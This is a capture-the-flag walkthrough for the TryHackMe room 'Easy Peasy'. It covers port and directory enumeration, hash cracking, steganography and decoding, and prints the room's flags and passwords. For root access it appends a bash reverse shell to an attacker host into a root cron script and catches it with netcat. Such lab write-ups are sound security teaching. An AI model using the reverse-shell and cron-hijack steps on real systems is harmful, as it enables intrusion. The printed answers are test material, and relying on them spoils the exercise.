# [Easy Peasy](https://tryhackme.com/room/easypeasyctf)

## Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.

# Enumeration through Nmap

## Deploy the machine attached to this task and use nmap to enumerate it.

```bash
nmap -p- -sV <TARGET_IP>
```

This command performs:

- `-p-`: Scans all 65535 ports
- `-sV`: Version detection to identify services running on open ports

[SCREEN01]

### How many ports are open?

- 3

### What is the version of nginx?

- 1.16.1

### What is running on the highest port?

- Apache

---

# Compromising the machine

## Now you've enumerated the machine, answer questions and compromise it!

### Using GoBuster, find flag 1.

1. Start by running GoBuster against the main web server on port 80:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

2. This reveals a `/hidden` directory. Enumerate further by scanning this directory:

```bash
gobuster dir -u http://<TARGET_IP>/hidden -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

[SCREEN02]

3. The scan reveals a `/whatever` subdirectory within `/hidden`.

4. Navigate to `http://<TARGET_IP>/hidden/whatever/` and view the page source.

5. In the HTML source code, you'll find the first flag encoded in Base64.

[SCREEN03]

6. Copy the Base64 string and decode it using [CyberChef](https://gchq.github.io/CyberChef/) with the "From Base64" operation.

[SCREEN04]

---

### Further enumerate the machine, what is flag 2?

1. Enumerate the Apache web server running on the port 65524:

```bash
gobuster dir -u http://<TARGET_IP>:65524/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

2. Navigate to `http://<TARGET_IP>:65524/robots.txt` and examine its contents:

```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

3. The string `a18672860d0510e5ab6699730763b250` appears to be an MD5 hash.

4. Use [MD5Hashing.net](https://md5hashing.net) or a similar MD5 decryption service to crack the hash.

[SCREEN05]

---

### Crack the hash with easypeasy.txt, What is the flag 3?

1. Inspect the `http://<TARGET_IP>:65524/` page to find Flag 3.

[SCREEN06]

---

### What is the hidden directory?

1. Navigate to `http://<TARGET_IP>:65524/` and view the page source.

2. In the HTML comments or source code, you'll find an encoded string: `ObsJmP173N2X6dOrAgEAL0Vu`

3. This string is encoded in Base62. Use [CyberChef](https://gchq.github.io/CyberChef/) with the "From Base62" operation.

[SCREEN07]

4. The decoded value reveals the **hidden directory path**: `/n0th1ng3ls3m4tt3r`.

---

### Using the wordlist that provided to you in this task crack the hash. what is the password?

_GOST Hash john --wordlist=easypeasy.txt --format=gost hash (optional\* Delete duplicated lines,Compare easypeasy.txt to rockyou.txt and delete same words)_

1. Navigate to `http://<TARGET_IP>:65524/n0th1ng3ls3m4tt3r/` to find a GOST hash.

[SCREEN0]

2. Copy the hash value displayed on the page and save it to a file:

```bash
echo "940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81" > hash.txt
```

3. The hash uses the GOST algorithm. Use John the Ripper with the GOST format:

```bash
john --wordlist=easypeasy_1596838725703.txt --format=gost hash.txt
```

**Password**: `mypasswordforthatjob`

[SCREEN09]

---

### What is the password to login to the machine via SSH?

1. Download image from `view-source:http://<TARGET_IP>:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg`

2. Use stegseek (or steghide) with the easypeasy wordlist to extract hidden data:

```bash
stegseek binarycodepixabay.jpg easypeasy_1596838725703.txt
```

[SCREEN10]

3. Stegseek will extract the hidden data to `binarycodepixabay.jpg.out`. The output file contains:

```
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

5. The password is encoded in binary. Use [CyberChef](https://gchq.github.io/CyberChef/) with the "From Binary" operation.

[SCREEN11]

**SSH Username**: `boring`  
**SSH Password**: `iconvertedmypasswordtobinary`

---

### What is the user flag?

1. Connect to the target machine via SSH on the custom port 6498:

```bash
ssh boring@<TARGET_IP> -p 6498
```

3. Once logged in, locate and read the user flag:

```bash
cat user.txt
```

[SCREEN12]

4. The flag is encoded using ROT13. Use [CyberChef](https://gchq.github.io/CyberChef/) with the "ROT13" operation to decode it.

[SCREEN13]

---

### What is the root flag?

1. Check for scheduled tasks and cronjobs that might provide privilege escalation opportunities:

```bash
cat /etc/crontab
```

[SCREEN14]

2. You'll find a cronjob running as root that executes `/var/www/.mysecretcronjob.sh` at regular intervals.

3. On your attacking machine, set up a netcat listener:

```bash
nc -lvnp 4444
```

6. On the target machine, view the current contents of the cronjob script and append a reverse shell payload:

```bash
cat /var/www/.mysecretcronjob.sh
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> /var/www/.mysecretcronjob.sh
```

[SCREEN15]

7. Wait for the cronjob to execute. You should receive a reverse shell connection as the root user.

8. Once you have root access, read the root flag:

```bash
cat /root/.root.txt
```

[SCREEN16]
